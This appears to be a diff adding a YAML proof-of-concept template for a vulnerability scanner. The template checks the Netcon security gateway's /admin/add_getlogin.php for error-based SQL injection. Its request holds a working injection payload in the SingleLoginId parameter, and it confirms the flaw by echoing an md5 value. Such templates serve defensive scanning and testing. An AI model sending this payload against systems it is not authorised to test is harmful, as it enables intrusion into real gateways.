@@ -1,0 +1,18 @@
+name: poc-yaml-ns-asg-sqli
+manual: true
+transport: http
+set:
+    rand: randomInt(2000, 2100)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /admin/add_getlogin.php?SingleLoginId=1%20and%20extractvalue(0x1,concat(0x7e7b7e,md5({{rand}})))%23
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+expression: r0()
+detail:
+    author: gsh3ll(gsh3ll.top)
+    links:
+        - http://trustcomputing.com.cn/bbs//viewthread.php?tid=482
+    description: 网康安全网关 add_get/login.php处存在SQL注入
